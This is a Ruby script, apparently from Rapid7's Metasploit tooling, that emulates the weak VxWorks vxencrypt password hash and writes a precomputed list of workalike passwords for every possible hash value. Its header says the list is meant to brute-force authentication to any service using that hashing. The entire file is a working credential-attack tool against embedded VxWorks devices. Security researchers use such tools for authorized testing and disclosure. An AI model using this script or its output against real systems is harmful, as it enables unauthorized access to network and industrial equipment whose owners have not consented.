#!/usr/bin/env ruby

# $Id$

#
# This script calculates all possible password hashes for the vxworks platform.
# The generated list can be used to bruteforce authentication to any service
# using the vulnerable password hashing mechanism on the backend.
#
# (C) 2010 Rapid7
#
# $Revision$
#


# VxWorks converts the clear-text password into single integer value. This value
# can only be one of about 210,000 possible options. The method below emulates
# what the vxencrypt utility does and was implemented based on publicly indexed
# documentation and source code snippets.

# XXX: Newer VxWorks can use passwords up to 120 characters long, but this is
#      not very common in the wild.

def vxworks_sum_from_pass(pass)
  if pass.length < 8 or pass.length > 40
    raise RuntimeError, "too short or too long"
  end

  sum   = 0
  bytes = pass.unpack("C*")
  bytes.each_index {|i| sum += (bytes[i] * (i + 1)) ^ (i + 1) }
  sum
end

# VxWorks does a final round of "mangling" on the generated additive sum. This
# mangle process does not add any additional security to the hashing mechanism
def vxworks_hash_from_sum(sum)
  magic = 31695317
  res = ((sum * magic) & 0xffffffff).to_s
  res.unpack("C*").map{ |c|
    c += 0x21 if c < 0x33
    c += 0x2f if c < 0x37
    c += 0x42 if c < 0x39
    c
  }.pack("C*")
end

# This method tries to find an exact match for a given sum. This is inefficient,
# but the master password only needs to be precomputed once.
def vxworks_pass_from_sum_refine(sum, bsum, pass)
  0.upto(pass.length-1) do |i|
    tpass = pass.dup
    while ( tpass[i, 1].unpack("C*")[0] > 0x21 )
      tpass[i, 1] = [ tpass[i, 1].unpack("C*")[0] - 1 ].pack("C")
      bsum = vxworks_sum_from_pass(tpass)
      if bsum == sum
        return tpass
      end
    end
  end
  0.upto(pass.length-1) do |i|
    tpass = pass.dup
    while ( tpass[i, 1].unpack("C*")[0] < 0x7c )
      tpass[i, 1] = [ tpass[i, 1].unpack("C*")[0] + 1 ].pack("C")
      bsum = vxworks_sum_from_pass(tpass)
      if bsum == sum
        return tpass
      end
    end
  end
  "<failed>"
end

# This method locates a "workalike" password that matches a given
# intermediate additive sum value.
def vxworks_pass_from_sum(sum, lpass=nil)
  opass = lpass || "\x20" * 8
  pass  = opass.dup
  fmax  = (sum > 10000) ? 0xff : 0x7b
  pidx  = 0
  pcnt  = pass[0,1].unpack("C*")[0]
  more  = false

  bsum = vxworks_sum_from_pass(pass)
  if bsum > sum
    return "<invalid>"
  end

  while bsum != sum

    if bsum > sum
      return vxworks_pass_from_sum_refine(sum, bsum, pass)
    end

    if pcnt > fmax
      pidx += 1

      if pidx == (pass.length)
        pass += " "
      end
      pcnt = pass[pidx, 1].unpack("C")[0]
    end

    pass[pidx,1] = [ pcnt ].pack("C")
    bsum  = vxworks_sum_from_pass(pass)
    pcnt += 1
  end
  pass
end

outputfile = ARGV.shift() || "masterpasswords.txt"

# Create the master password list output file
ofd = File.open(outputfile, "wb")

# Generate a wide range of "seeds" - the goal is to create a
# workalike password with the smallest number of characters,
# but still be printable when possible.

seedsets = []

seeds = []
8.upto(8) do |slen|
  0x23.upto(0x7c) do |cset|
    sbase = [cset].pack("C") * slen
    seeds << [ vxworks_sum_from_pass(sbase), sbase ]
  end
end
seedsets << seeds


seeds = []
8.upto(12) do |slen|
  0x23.upto(0x7c) do |cset|
    sbase = [cset].pack("C") * slen
    seeds << [ vxworks_sum_from_pass(sbase), sbase ]
  end
end
seedsets << seeds

seeds = []
8.upto(16) do |slen|
  0x23.upto(0xf0) do |cset|
    sbase = [cset].pack("C") * slen
    seeds << [ vxworks_sum_from_pass(sbase), sbase ]
  end
end
seedsets << seeds

seeds = []
8.upto(16) do |slen|
  0x23.upto(0xff) do |cset|
    sbase = [cset].pack("C") * slen
    seeds << [ vxworks_sum_from_pass(sbase), sbase ]
  end
end
seedsets << seeds

seeds = []
8.upto(40) do |slen|
  0x23.upto(0xff) do |cset|
    sbase = [cset].pack("C") * slen
    seeds << [ vxworks_sum_from_pass(sbase), sbase ]
  end
end
seedsets << seeds


# Calculate passwords and their hashes for all possible outputs
1.upto(209656) do |i|
  found = false
  seedsets.each do |seeds|
    lhash = nil
    seeds.reverse.each do |s|
      if i > (s[0] + 1000)
        lhash = s[1]
        break
      end
    end

    hash = vxworks_hash_from_sum(i)
    pass = vxworks_pass_from_sum(i, lhash)

    puts "[*] Generated #{i} of 209656 passwords..." if (i % 1000 == 0)
    # The first 1187 passwords are not very likely to occur and we skip
    # generation. These are "sums" that result in a value lesss than a
    # 8 digit password of all spaces.

    if i > 1187 and pass =~ /<.*>/
      # p "#{i} SEED '#{lhash}' => '#{hash}' => '#{pass}'"
      next
    end
    ofd.puts "#{i}|#{hash}|#{pass}\x00"
    found = true
    break
  end

  if not found
    puts "FAILED TO GENERATE #{i}"
    exit(0)
  end
end

